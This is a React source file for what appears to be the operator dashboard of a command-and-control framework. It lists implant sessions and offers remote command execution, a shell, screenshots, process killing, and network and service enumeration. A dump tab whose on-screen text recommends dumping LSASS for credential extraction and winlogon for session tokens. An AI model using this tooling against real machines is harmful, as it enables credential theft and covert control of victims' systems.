        {tab === 'services' && isWindows && (
          <div className="bg-surface border border-border rounded-lg overflow-hidden">
            <div className="flex items-center justify-between px-3 py-2 border-b border-border">
              <span className="text-[9px] text-primary font-bold uppercase tracking-widest">Windows Services</span>
              <button onClick={loadServices} disabled={loading} className={btnCls}>
                {loading ? 'Loading…' : 'Load Services'}
              </button>
            </div>
            {services.length > 0 && (
              <div className="overflow-y-auto max-h-96">
                <div className="grid text-[8px] font-bold text-muted/60 uppercase tracking-wider px-3 py-1 border-b border-border/30 bg-bg/40"
                  style={{ gridTemplateColumns: '100px 1fr 60px 60px' }}>
                  <span>Name</span><span>Binary Path</span><span>Status</span><span>Startup</span>
                </div>
                {services.map(s => (
                  <div key={s.name} className="grid items-center px-3 py-1 border-b border-border/15 hover:bg-white/4 text-[10px]"
                    style={{ gridTemplateColumns: '100px 1fr 60px 60px' }}>
                    <div>
                      <div className="font-mono text-text truncate">{s.name}</div>
                      <div className="text-muted/60 text-[8px] truncate">{s.display_name}</div>
                    </div>
                    <span className="text-muted/70 font-mono text-[9px] truncate pr-2">{s.bin_path}</span>
                    <span className={`text-[9px] font-bold ${s.status === 4 ? 'text-primary' : 'text-muted/60'}`}>
                      {s.status === 4 ? 'RUNNING' : s.status === 1 ? 'STOPPED' : String(s.status)}
                    </span>
                    <span className="text-[9px] text-muted/60">
                      {s.startup_type === 2 ? 'AUTO' : s.startup_type === 3 ? 'MAN' : s.startup_type === 4 ? 'DIS' : String(s.startup_type)}
                    </span>
                  </div>
                ))}
              </div>
            )}
            {services.length === 0 && !loading && (
              <div className="p-4 text-muted text-xs text-center">Click "Load Services" to enumerate Windows services</div>
            )}
          </div>
        )}

        {/* ── Procdump tab ─────────────────────────────────────── */}
        {tab === 'dump' && (
          <div className="bg-surface border border-border rounded-lg p-3 space-y-3">
            <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Process Memory Dump</div>
            <p className="text-[10px] text-muted">Dump a process's memory to a .dmp file. Use LSASS (PID from Processes tab) for credential extraction.</p>
            <div className="flex items-center gap-2">
              <input value={dumpPid} onChange={e => setDumpPid(e.target.value)} placeholder="PID (e.g. 600 for lsass)" className={`${inputCls} max-w-[150px]`} />
              <button onClick={dumpProcess} disabled={loading || !dumpPid.trim()} className={btnCls}>
                {loading ? 'Dumping…' : '💾 Dump Process'}
              </button>
            </div>
            <div className="text-[9px] text-muted bg-bg border border-border/50 rounded p-2">
              Common PIDs to dump:<br/>
              • <span className="text-accent">LSASS</span> — credentials (find PID in Processes tab → filter "lsass")<br/>
              • <span className="text-accent">winlogon.exe</span> — session tokens<br/>
              • <span className="text-accent">Any process</span> — memory analysis
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

// ─── Process Manager ─────────────────────────────────────────────────────────
function ProcessManager({ sessionId }: { sessionId: string }) {
  const { data, loading, error, refresh } = useAPI<ProcessInfo[]>(`/api/sessions/${sessionId}/ps`, 0)
  const [filter, setFilter]   = useState('')
  const [killing, setKilling] = useState<number | null>(null)
  const [killMsg, setKillMsg] = useState<string | null>(null)

  const procs = (data ?? []).filter(p =>
    !filter || p.executable?.toLowerCase().includes(filter.toLowerCase()) ||
               String(p.pid).includes(filter) || p.owner?.toLowerCase().includes(filter.toLowerCase())
  )

  async function killProc(pid: number) {
    setKilling(pid)
    try {
      await apiFetch(`/api/sessions/${sessionId}/ps/${pid}`, { method: 'DELETE' })
      setKillMsg(`Process ${pid} terminated`)
      setTimeout(() => setKillMsg(null), 3000)
      refresh()
    } catch (e) { setKillMsg(`Failed: ${e}`) }
    finally { setKilling(null) }
  }

  return (
    <div className="flex flex-col h-full min-h-0">
      <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border">
        <Activity size={11} className="text-primary shrink-0" />
        <span className="text-[10px] text-muted font-bold uppercase tracking-wider">Processes</span>
        {data && <span className="text-[9px] text-muted/60">{data.length} running</span>}
        <div className="flex-1 flex items-center gap-1 bg-bg/60 border border-border rounded px-2 py-0.5 ml-2">
          <Search size={9} className="text-muted shrink-0" />
          <input value={filter} onChange={e => setFilter(e.target.value)} placeholder="filter by name / pid / owner…"
            className="flex-1 bg-transparent text-[9px] text-text placeholder-muted/50 outline-none" />
        </div>
        <button onClick={refresh} className="text-muted hover:text-primary shrink-0">
          <RefreshCw size={10} className={loading ? 'animate-spin' : ''} />
        </button>
      </div>
      {killMsg && <div className="shrink-0 px-3 py-1 text-[9px] text-primary bg-primary/10 border-b border-border">{killMsg}</div>}
      {/* Column headers */}
      <div className="shrink-0 grid text-[8px] font-bold text-muted/60 uppercase tracking-wider px-3 py-1 border-b border-border/30 bg-surface/20"
        style={{ gridTemplateColumns: '56px 56px 1fr 120px 64px 32px' }}>
        <span>PID</span><span>PPID</span><span>Executable</span><span>Owner</span><span>Arch</span><span />
      </div>
      <div className="flex-1 overflow-y-auto">
        {loading ? (
          <div className="flex items-center justify-center p-8"><Loader size={16} className="text-muted animate-spin" /></div>
        ) : error ? (
          <div className="p-4 text-danger text-xs text-center">{error}</div>
        ) : procs.length === 0 ? (
          <div className="p-4 text-muted text-xs text-center">No processes found</div>
        ) : procs.map(p => (
          <div key={p.pid}
            className="grid items-center px-3 py-1 border-b border-border/15 hover:bg-white/4 group text-[10px] font-mono"
            style={{ gridTemplateColumns: '56px 56px 1fr 120px 64px 32px' }}>
            <span className="text-primary tabular-nums">{p.pid}</span>
            <span className="text-muted/60 tabular-nums">{p.ppid}</span>
            <div className="min-w-0">
              <div className="text-text truncate">{p.executable}</div>
              {p.cmdline?.length > 1 && (
                <div className="text-muted/50 text-[8px] truncate">{p.cmdline.slice(1).join(' ')}</div>
              )}
            </div>
            <span className="text-muted truncate">{p.owner}</span>
            <span className="text-muted/60 text-[9px]">{p.arch}</span>
            <button onClick={() => killProc(p.pid)} disabled={killing === p.pid}
              className="text-muted hover:text-danger opacity-0 group-hover:opacity-100 transition-all disabled:opacity-40"
              title={`Kill PID ${p.pid}`}>
              {killing === p.pid ? <Loader size={10} className="animate-spin" /> : <X size={10} />}
            </button>
          </div>
        ))}
      </div>
    </div>
  )
}

// ─── Network View ────────────────────────────────────────────────────────────
function NetworkView({ sessionId }: { sessionId: string }) {
  const [tab, setTab] = useState<'ifaces'|'sockets'>('ifaces')
  const { data: ifaces, loading: ifLoading, refresh: ifRefresh } = useAPI<NetIface[]>(`/api/sessions/${sessionId}/ifconfig`, 0)
  const { data: sockets, loading: skLoading, refresh: skRefresh } = useAPI<NetSocket[]>(`/api/sessions/${sessionId}/netstat`, 0)
  const [sockFilter, setSockFilter] = useState('')

  const filteredSockets = (sockets ?? []).filter(s =>
    !sockFilter || s.local_addr.includes(sockFilter) || s.peer_addr.includes(sockFilter) || s.state.toLowerCase().includes(sockFilter.toLowerCase())
  )

  return (
    <div className="flex flex-col h-full min-h-0">
      <div className="shrink-0 flex items-center gap-0 border-b border-border">
        {(['ifaces', 'sockets'] as const).map(t => (
          <button key={t} onClick={() => setTab(t)}
            className={`px-4 py-2 text-[10px] border-b-2 transition-colors ${tab === t ? 'border-primary text-primary font-semibold' : 'border-transparent text-muted hover:text-text'}`}>
            {t === 'ifaces' ? '🌐 Interfaces' : '🔌 Connections'}
          </button>
        ))}
        <button onClick={() => tab === 'ifaces' ? ifRefresh() : skRefresh()}
          className="ml-auto mr-3 text-muted hover:text-primary">
          <RefreshCw size={10} className={(tab === 'ifaces' ? ifLoading : skLoading) ? 'animate-spin' : ''} />
        </button>
      </div>

      {tab === 'ifaces' ? (
        <div className="flex-1 overflow-y-auto p-3 space-y-2">
          {ifLoading && <div className="flex items-center justify-center p-8"><Loader size={16} className="text-muted animate-spin" /></div>}
          {(ifaces ?? []).map(iface => (
            <div key={iface.name} className="bg-surface border border-border rounded-lg p-3">
              <div className="flex items-center gap-2 mb-2">
                <Globe size={12} className="text-primary" />
                <span className="text-xs font-bold text-text">{iface.name}</span>
                {iface.hw_addr && <span className="text-[9px] text-muted font-mono">{iface.hw_addr}</span>}
              </div>
              <div className="space-y-0.5 pl-5">
                {(iface.ip_addresses ?? []).map(ip => (
                  <div key={ip} className="text-[10px] font-mono text-accent">{ip}</div>
                ))}
                {(iface.ip_addresses ?? []).length === 0 && <div className="text-[10px] text-muted/50">no addresses</div>}
              </div>
            </div>
          ))}
          {!ifLoading && (ifaces ?? []).length === 0 && <div className="p-4 text-muted text-xs text-center">No interfaces found</div>}
        </div>
      ) : (
        <div className="flex flex-col h-full min-h-0">
          <div className="shrink-0 px-3 py-1.5 border-b border-border">
            <div className="flex items-center gap-1.5 bg-bg/60 border border-border rounded px-2 py-0.5">
              <Search size={9} className="text-muted" />
              <input value={sockFilter} onChange={e => setSockFilter(e.target.value)} placeholder="filter address / state…"
                className="flex-1 bg-transparent text-[9px] text-text placeholder-muted/50 outline-none" />
            </div>
          </div>
          <div className="shrink-0 grid text-[8px] font-bold text-muted/60 uppercase tracking-wider px-3 py-1 border-b border-border/30 bg-surface/20"
            style={{ gridTemplateColumns: '60px 1fr 1fr 80px' }}>
            <span>Proto</span><span>Local</span><span>Remote</span><span>State</span>
          </div>
          <div className="flex-1 overflow-y-auto">
            {skLoading && <div className="flex items-center justify-center p-8"><Loader size={16} className="text-muted animate-spin" /></div>}
            {filteredSockets.map((s, i) => (
              <div key={i} className="grid items-center px-3 py-1 border-b border-border/15 hover:bg-white/4 text-[10px] font-mono"
                style={{ gridTemplateColumns: '60px 1fr 1fr 80px' }}>
                <span className="text-primary">{s.protocol}</span>
                <span className="text-text truncate">{s.local_addr}</span>
                <span className="text-muted truncate">{s.peer_addr || '—'}</span>
                <span className={`text-[9px] ${s.state === 'ESTABLISHED' ? 'text-primary' : 'text-muted/60'}`}>{s.state}</span>
              </div>
            ))}
            {!skLoading && filteredSockets.length === 0 && <div className="p-4 text-muted text-xs text-center">No connections found</div>}
          </div>
        </div>
      )}
    </div>
  )
}

// ─── Overview view ────────────────────────────────────────────────────────────
function Overview({ session, config, running, onExec, lastTask }: {
  session: Session; config: OSConfig; running: boolean
  onExec: (cmd: string, label: string) => void; lastTask: Task | null
}) {
  return (
    <div className="flex flex-col gap-4 p-4 overflow-y-auto h-full">
      {/* Session info cards */}
      <div className="grid grid-cols-3 gap-3">
        {/* System card */}
        <div className="bg-surface border border-border rounded-lg p-3 space-y-1">
          <div className="text-[9px] text-primary font-bold uppercase tracking-widest mb-2">System</div>
          <div className="text-xs font-bold text-text">{session.hostname}</div>
          <div className="text-[10px] text-muted">{session.os}</div>
          <div className="text-[10px] text-muted">{session.arch}</div>
          <div className="text-[10px] text-muted">{session.transport}</div>
        </div>
        {/* Identity card */}
        <div className="bg-surface border border-border rounded-lg p-3 space-y-1">
          <div className="text-[9px] text-primary font-bold uppercase tracking-widest mb-2">Identity</div>
          <div className="text-xs font-bold text-text">{session.username}</div>
          <div className="text-[10px] text-muted">{session.remote_address}</div>
          <div className="text-[10px] text-muted">{session.active_c2}</div>
          <div className="flex items-center gap-1 mt-1">
            <span className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse" />
            <span className="text-[9px] text-primary">Live session</span>
          </div>
        </div>
        {/* Checkin card */}
        <div className="bg-surface border border-border rounded-lg p-3 space-y-1">
          <div className="text-[9px] text-primary font-bold uppercase tracking-widest mb-2">Session</div>
          <div className="text-[10px] text-muted">ID</div>
          <div className="text-[9px] font-mono text-text truncate">{session.id}</div>
          <div className="text-[10px] text-muted mt-1">Last seen</div>
          <div className="text-[9px] text-text">{fmtDate(session.last_checkin)}</div>
        </div>
      </div>

      {/* Quick Recon */}
      <div>
        <div className="text-[9px] text-muted font-bold uppercase tracking-widest mb-2 px-1">Quick Recon</div>
        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2">
          {config.quickCmds.map(q => (
            <button key={q.label} disabled={running} onClick={() => onExec(q.cmd, q.label)}
              className="flex items-center gap-2 px-3 py-2 rounded-lg border border-border bg-surface hover:border-primary/40 hover:bg-primary/5 transition-all text-left disabled:opacity-40 group">
              <span className="text-base shrink-0">{q.icon}</span>
              <span className="text-[10px] text-muted group-hover:text-text">{q.label}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Last output */}
      {lastTask && (
        <div>
          <div className="text-[9px] text-muted font-bold uppercase tracking-widest mb-2 px-1 flex items-center gap-2">
            Last Output
            <span className={`text-[8px] px-1.5 py-0.5 rounded font-bold ${
              lastTask.ok ? 'bg-primary/15 text-primary' : 'bg-danger/20 text-danger'
            }`}>{lastTask.cmd}</span>
          </div>
          <pre className="bg-bg border border-border/50 rounded-lg px-4 py-3 text-[10px] font-mono text-text/90 whitespace-pre-wrap break-all max-h-64 overflow-y-auto leading-relaxed">
            {lastTask.result}
          </pre>
        </div>
      )}
    </div>
  )
}

// ─── Nav item ─────────────────────────────────────────────────────────────────
type ViewID = 'overview' | 'files' | 'procs' | 'network' | 'powerops' | 'modules' | 'tasks'
const VIEWS: { id: ViewID; icon: React.ElementType; label: string }[] = [
  { id: 'overview',  icon: LayoutDashboard, label: 'Overview'  },
  { id: 'files',     icon: FolderOpen,      label: 'Files'     },
  { id: 'procs',     icon: Activity,        label: 'Processes' },
  { id: 'network',   icon: Wifi,            label: 'Network'   },
  { id: 'powerops',  icon: Shield,          label: 'Power Ops' },
  { id: 'modules',   icon: Package,         label: 'Modules'   },
  { id: 'tasks',     icon: List,            label: 'Tasks'     },
]

// ═══════════════════════════════════════════════════════════════════════════════
// Main OSPanel component
// ═══════════════════════════════════════════════════════════════════════════════
interface Props {
  config: OSConfig
  onOpenTerminal: TerminalCb
}

let _tid = 0

export default function OSPanel({ config, onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 5_000)
  const sessions = (data ?? []).filter(config.filter)

  const [selId,       setSelId]      = useState<string | null>(null)
  const [view,        setView]       = useState<ViewID>('overview')
  const [tasks,       setTasks]      = useState<Task[]>([])
  const [running,     setRunning]    = useState(false)
  const [custom,      setCustom]     = useState('')
  const [search,      setSearch]     = useState('')
  const [copied,      setCopied]     = useState<number | null>(null)
  const [screenshot,  setScreenshot] = useState<string | null>(null)
  const [ssLoading,   setSsLoading]  = useState(false)

  const sel = sessions.find(s => s.id === selId) ?? null

  async function exec(cmd: string, label: string) {
    if (!selId || running) return
    setRunning(true)
    const id = ++_tid
    try {
      const r = await apiPost<ExecResult>(`/api/sessions/${selId}/execute`, { command: cmd })
      const out = (r.stdout || '') + (r.stderr ? (r.stdout ? '\n[stderr]\n' + r.stderr : r.stderr) : '')
      const result = out.trim() || '[command executed — no output returned]'
      setTasks(p => [{ id, cmd: label, result: result.slice(0, 8000), ok: r.exit_code === 0, ts: Date.now(), open: true }, ...p].slice(0, 100))
      // Switch to tasks view to show output
      setView('tasks')
    } catch (e) {
      setTasks(p => [{ id, cmd: label, result: String(e), ok: false, ts: Date.now(), open: true }, ...p].slice(0, 100))
      setView('tasks')
    } finally { setRunning(false) }
  }

  function copy(id: number, text: string) {
    navigator.clipboard.writeText(text).then(() => { setCopied(id); setTimeout(() => setCopied(null), 1500) })
  }

  function toggleTask(id: number) {
    setTasks(p => p.map(t => t.id === id ? { ...t, open: !t.open } : t))
  }

  async function takeScreenshot() {
    if (!selId) return
    setSsLoading(true)
    try {
      const r = await apiFetch<{ data: string }>(`/api/sessions/${selId}/screenshot`)
      setScreenshot(r.data ? `data:image/png;base64,${r.data}` : null)
    } catch (e) { alert('Screenshot failed: ' + e) }
    finally { setSsLoading(false) }
  }

  function selectSession(id: string) {
    setSelId(id); setTasks([]); setView('overview'); setCustom(''); setScreenshot(null)
  }

  return (
    <div className="flex h-full overflow-hidden rounded-lg border border-border bg-bg font-mono">

      {/* ══ SESSION LIST ═══════════════════════════════════════════════════ */}
      <aside className="w-44 shrink-0 flex flex-col border-r border-border" style={{ background: '#090909' }}>
        <div className="flex items-center justify-between px-3 py-2.5 border-b border-border">
          <span className="text-[10px] font-bold tracking-widest text-muted uppercase flex items-center gap-1.5">
            <span>{config.icon}</span>{config.name}
          </span>
          <button onClick={refresh} className="text-muted hover:text-primary">
            <RefreshCw size={11} className={loading ? 'animate-spin' : ''} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto py-1">
          {!loading && sessions.length === 0 && (
            <div className="p-4 text-center space-y-1">
              <Monitor size={18} className="text-border mx-auto" />
              <p className="text-muted text-[10px]">No {config.name} sessions</p>
            </div>
          )}
          {sessions.map(s => {
            const active = s.id === selId
            return (
              <button key={s.id} onClick={() => selectSession(s.id)}
                className={`w-full text-left px-2.5 py-2 border-b border-border/15 transition-all group ${
                  active ? 'bg-primary/8 border-l-2 border-l-primary' : 'hover:bg-white/4'
                }`}>
                <div className="flex items-center gap-1.5 mb-0.5">
                  <span className={`w-1.5 h-1.5 rounded-full shrink-0 transition-colors ${
                    s.is_dead ? 'bg-danger' : active ? 'bg-primary animate-pulse' : 'bg-muted/50'
                  }`} />
                  <span className={`text-[11px] font-semibold truncate ${active ? 'text-text' : 'text-muted group-hover:text-accent'}`}>
                    {s.hostname}
                  </span>
                </div>
                <div className="pl-3 space-y-0.5">
                  <div className="text-[9px] text-muted/70 truncate">{s.username}</div>
                  <div className="text-[9px] text-muted/50 truncate">{s.remote_address}</div>
                </div>
              </button>
            )
          })}
        </div>
        {error && <p className="px-2 py-1 text-[9px] text-danger border-t border-border/30">{error}</p>}
      </aside>

      {/* ══ MACHINE VIEW ═══════════════════════════════════════════════════ */}
      {!selId ? (
        /* Empty state */
        <div className="flex-1 flex flex-col items-center justify-center gap-4 p-8 text-center">
          <div className="w-16 h-16 rounded-2xl border-2 border-border/30 flex items-center justify-center text-4xl">
            {config.icon}
          </div>
          <div>
            <div className="text-muted text-sm font-semibold mb-1">Select a {config.name} session</div>
            <div className="text-muted/50 text-xs max-w-xs leading-relaxed">
              Connect an implant on a {config.name} target, then select it from the session list
            </div>
          </div>
        </div>
      ) : (
        <div className="flex-1 flex flex-col min-w-0 min-h-0">

          {/* Machine header */}
          <div className="shrink-0 flex items-center justify-between px-4 py-2 border-b border-border"
            style={{ background: '#0c0c0c' }}>
            <div className="flex items-center gap-3 min-w-0">
              <span className="text-xl shrink-0">{config.icon}</span>
              <div className="min-w-0">
                <div className="flex items-center gap-2">
                  <span className="text-sm font-bold text-text truncate">{sel?.hostname}</span>
                  <span className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse shrink-0" />
                </div>
                <div className="text-[10px] text-muted flex items-center gap-2 flex-wrap">
                  <span className="text-accent">{sel?.username}</span>
                  <span className="text-border">·</span>
                  <span>{sel?.remote_address}</span>
                  <span className="text-border">·</span>
                  <span>{sel?.os} {sel?.arch}</span>
                </div>
              </div>
            </div>

            {/* Actions */}
            <div className="flex items-center gap-2 shrink-0">
              {/* Custom command */}
              <div className="hidden lg:flex items-center gap-1.5 bg-bg/60 border border-border/60 rounded px-2 py-1">
                <span className="text-muted text-[10px] font-bold">{config.prompt}</span>
                <input value={custom} onChange={e => setCustom(e.target.value)}
                  onKeyDown={e => { if (e.key === 'Enter' && custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
                  placeholder="command…" className="w-36 bg-transparent text-[10px] text-text placeholder-muted/40 outline-none" />
                <button onClick={() => { if (custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
                  disabled={running || !custom.trim()} className="text-muted hover:text-primary disabled:opacity-30">
                  {running ? <Loader size={10} className="animate-spin" /> : <Send size={10} />}
                </button>
              </div>
              {/* Screenshot */}
              <button onClick={takeScreenshot} disabled={ssLoading}
                title="Take screenshot"
                className="flex items-center gap-1.5 px-2.5 py-1 rounded border border-border/60 text-[10px] text-muted hover:border-primary/40 hover:text-primary transition-colors disabled:opacity-40">
                {ssLoading ? <Loader size={10} className="animate-spin" /> : <Camera size={10} />}
              </button>
              {/* Terminal */}
              <button onClick={() => onOpenTerminal(selId, sel?.hostname)}
                className="flex items-center gap-1.5 px-2.5 py-1 rounded border border-border/60 text-[10px] text-muted hover:border-primary/40 hover:text-primary transition-colors">
                <Terminal size={10} /> Shell
              </button>
            </div>
          </div>

          {/* View navigation */}
          <div className="shrink-0 flex items-center gap-0 border-b border-border" style={{ background: '#0a0a0a' }}>
            {VIEWS.map(v => {
              const Icon = v.icon
              const active = view === v.id
              return (
                <button key={v.id} onClick={() => setView(v.id)}
                  className={`flex items-center gap-1.5 px-4 py-2.5 text-[10px] border-b-2 transition-colors ${
                    active ? 'border-primary text-primary font-semibold' : 'border-transparent text-muted hover:text-text'
                  }`}>
                  <Icon size={11} />
                  {v.label}
                  {v.id === 'tasks' && tasks.length > 0 && (
                    <span className="ml-1 bg-border/60 text-muted text-[8px] px-1.5 py-0.5 rounded-full">{tasks.length}</span>
                  )}
                </button>
              )
            })}
          </div>

          {/* View content */}
          <div className="flex-1 min-h-0 overflow-hidden">
            {view === 'overview' && sel && (
              <>
                <Overview
                  session={sel}
                  config={config}
                  running={running}
                  onExec={exec}
                  lastTask={tasks[0] ?? null}
                />
                {/* Screenshot modal */}
                {screenshot && (
                  <div className="absolute inset-0 z-50 bg-bg/95 flex flex-col items-center justify-center p-4 gap-3">
                    <div className="flex items-center justify-between w-full max-w-3xl">
                      <span className="text-xs text-muted font-semibold">Screenshot — {sel.hostname}</span>
                      <button onClick={() => setScreenshot(null)} className="text-muted hover:text-text"><X size={14} /></button>
                    </div>
                    <img src={screenshot} alt="screenshot" className="max-w-full max-h-[80vh] rounded border border-border object-contain" />
                  </div>
                )}
              </>
            )}
            {view === 'files' && (
              <FileManager sessionId={selId} config={config} onExec={exec} />
            )}
            {view === 'procs' && selId && (
              <ProcessManager sessionId={selId} />
            )}
            {view === 'network' && selId && (
              <NetworkView sessionId={selId} />
            )}
            {view === 'powerops' && selId && (
              <PowerOps sessionId={selId} osName={config.name} />
            )}
            {view === 'modules' && (
              <ModuleAccordion
                modules={config.modules}
                running={running}
                onExec={(cmd, label) => { exec(cmd, label) }}
                search={search}
                onSearch={setSearch}
              />
            )}
            {view === 'tasks' && (
              <TaskHistory
                tasks={tasks}
                running={running}
                onClear={() => setTasks([])}
                onToggle={toggleTask}
                copied={copied}
                onCopy={copy}
              />
            )}
          </div>
        </div>
      )}
    </div>
  )
}
